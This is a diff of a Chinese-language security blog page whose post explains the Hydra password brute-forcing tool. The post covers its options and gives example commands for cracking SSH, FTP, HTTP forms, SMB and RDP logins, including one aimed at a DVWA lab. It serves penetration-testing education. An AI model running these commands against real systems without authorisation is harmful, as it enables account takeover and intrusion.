@@ -4,7 +4,7 @@
 <meta name="description" content="" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 
-<title>nmap | Esp0x</title>
+<title>Hydra暴力破解工具简单使用说明 | Esp0x</title>
 
 <link rel="shortcut icon" href="https://esp0x.github.io/favicon.ico?v=1626396001176">
 
@@ -33,11 +33,11 @@
 <!--<script src="media/scripts/index.js"></script>-->
 
 
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
 </head>
 <body>
 <div class="main gt-bg-theme-color-first">
-    <div class="main-content">
-        <style>
+    <style>
     /* 导航栏样式 */
     .navbar {
         position: relative;
@@ -198,49 +198,108 @@
         }
     }
 </script>
-        <div class="current-tag-container">
-            <h2 class="title gt-c-content-color-first">
-                #nmap
-            </h2>
-        </div>
-        <div class="post-list-container">
-    <div class="post-inner">
-        
-            <div class="post gt-bg-theme-color-second">
-                <div class="post-left">
-                    <div>
-                        
-                        <a href="https://esp0x.github.io/post/nmap-gong-ju-chang-yong-shi-yong-chang-jing/">
-                            <span class="post-title gt-c-content-color-first">Nmap工具常用使用场景</span>
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    Hydra暴力破解工具简单使用说明
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2021-07-16 ·
+                    </time>
+                    
+                        <a href="https://esp0x.github.io/tag/tdcjZJ8GF/" class="post-tags">
+                            # 安全工具
                         </a>
-                    </div>
-                    <div class="gt-post-content post-abstract gt-c-content-color-second">
-                        
-                    </div>
-                    <div class="post-info">
-                        <time class="post-time gt-c-content-color-first">
-                            发布于 · 2021-03-29 ·
-                        </time>
-                        
-                            <a href="https://esp0x.github.io/tag/10NnMGZ95/" class="post-tag">
-                                # nmap
-                            </a>
-                        
-                            <a href="https://esp0x.github.io/tag/ETGdbG1UX/" class="post-tag">
-                                # 工具使用
-                            </a>
-                        
-                    </div>
+                    
+                        <a href="https://esp0x.github.io/tag/a5GDIyqF3/" class="post-tags">
+                            # 信息安全
+                        </a>
+                    
                 </div>
-                
+                <div class="post-content">
+                    <h3 id="支持的破解协议">支持的破解协议</h3>
+<h4 id="afpcisco-aaacisco身份验证cisco启用cvsfirebirdftphttp-form-gethttp-form-posthttp-gethttp-headhttp-proxyhttps-form-gethttps-form-posthttps-gethttps-headhttp-proxyicqimapircldapms-sqlmysqlncpnntporacle-listeneroracle-sidoraclepc-anywhere-pcnfspop3postgresrdprexecrloginrshsap-r3sipsmbsmtpsmtp枚举snmpsocks5sshv1和v2subversionteamspeakts2telnetvmware-auth-vnc和xmpp">AFP，Cisco AAA，Cisco身份验证，Cisco启用，CVS，Firebird，FTP，HTTP-FORM-GET，HTTP-FORM-POST，HTTP-GET，HTTP-HEAD，HTTP-PROXY，HTTPS-FORM- GET，HTTPS-FORM-POST，HTTPS-GET，HTTPS-HEAD，HTTP-Proxy，ICQ，IMAP，IRC，LDAP，MS-SQL，MYSQL，NCP，NNTP，Oracle Listener，Oracle SID，Oracle，PC-Anywhere， PCNFS，POP3，POSTGRES，RDP，Rexec，Rlogin，Rsh，SAP / R3，SIP，SMB，SMTP，SMTP枚举，SNMP，SOCKS5，SSH（v1和v2），Subversion，Teamspeak（TS2），Telnet，VMware-Auth ，VNC和XMPP。</h4>
+<h3 id="参数列表">参数列表</h3>
+<pre><code class="language-shell">-R：继续从上一次进度接着破解
+-S：大写，采用SSL链接
+-s  &lt;PORT&gt;：小写，可通过这个参数指定非默认端口
+-l  &lt;LOGIN&gt;：指定破解的用户，对特定用户破解
+-L  &lt;FILE&gt;：指定用户名字典
+-p  &lt;PASS&gt;：小写，指定密码破解，少用，一般是采用密码字典
+-P  &lt;FILE&gt;：大写，指定密码字典
+-e  &lt;ns&gt;：可选选项，n：空密码试探，s：使用指定用户和密码试探
+-C  &lt;FILE&gt;：使用冒号分割格式，例如“登录名:密码”来代替 -L/-P 参数
+-M  &lt;FILE&gt;：指定目标列表文件一行一条
+-o  &lt;FILE&gt;：指定结果输出文件
+-f ：在使用-M参数以后，找到第一对登录名或者密码的时候中止破解
+-t &lt;TASKS&gt;：同时运行的线程数，默认为16
+-w &lt;TIME&gt;：设置最大超时的时间，单位秒，默认是30s
+-v / -V：显示详细过程
+server：目标ip
+service：指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等
+OPT：可选项
+</code></pre>
+<h3 id="使用场景">使用场景</h3>
+<h3 id="破解ssh">破解SSH</h3>
+<pre><code class="language-shell"># hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.104 ssh
+# hydra -L users.txt -P password.txt -t 1 -vV -e ns -o save.log 192.168.1.104 ssh
+</code></pre>
+<h3 id="破解ftp">破解FTP</h3>
+<pre><code class="language-shell"># hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
+# hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV
+</code></pre>
+<h3 id="破解http">破解HTTP</h3>
+<pre><code class="language-shell">// get 方式提交，破解web登陆
+# hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/
+# hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php
+
+// post 方式提交(这里有两种，根据实际情况来构成命令)
+// 需要提前采集认证通信时的数据包，以便确定参数名称
+# hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form &quot;index.php:name=^USER^&amp;pwd=^PASS^:&lt;title&gt;invalido&lt;/title&gt;&quot;
+# hydra -L user.txt \
+			-P passwd.txt \
+			-o http_get.txt \
+			-vV 10.96.10.208 \
+			http-get-form  &quot;/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=Username and/or password incorrect:H=Cookie: PHPSESSID=nvvrgk2f84qhnh43cm28pt42n6; security=low&quot; \
+			-t 3
+USER^和^
+PASS^代表是攻击载荷，
+F=后面是代表密码错误时的关键字符串 ，
+H后面是cookie信息
+</code></pre>
+<h3 id="破解https">破解HTTPS</h3>
+<pre><code class="language-shell"># hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https
+</code></pre>
+<h3 id="破解http-proxy">破解http-proxy</h3>
+<pre><code class="language-shell"># hydra -l admin -P pass.txt http-proxy://10.36.16.18
+</code></pre>
+<h3 id="破解smb">破解SMB</h3>
+<pre><code class="language-shell"># hydra -l administrator -P pass.txt 10.36.16.18 smb
+</code></pre>
+<h3 id="破解3389远程登陆">破解3389远程登陆</h3>
+<pre><code class="language-shell"># hydra ip rdp -l administrator -P pass.txt -V
+</code></pre>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://esp0x.github.io/post/sublist3r-zi-yu-ming-sao-miao-gong-ju-shi-yong-shuo-ming/" class="post-title gt-a-link">
+                    Sublist3r子域名扫描工具使用说明
+                </a>
             </div>
         
-    </div>
-</div>
-        <div class="pagination-container">
-    
-    
-</div>
+
+        
+
+        
+
+        
 
         <div class="site-footer gt-c-content-color-first">
     <div class="slogan gt-c-content-color-first">温故而知新</div>
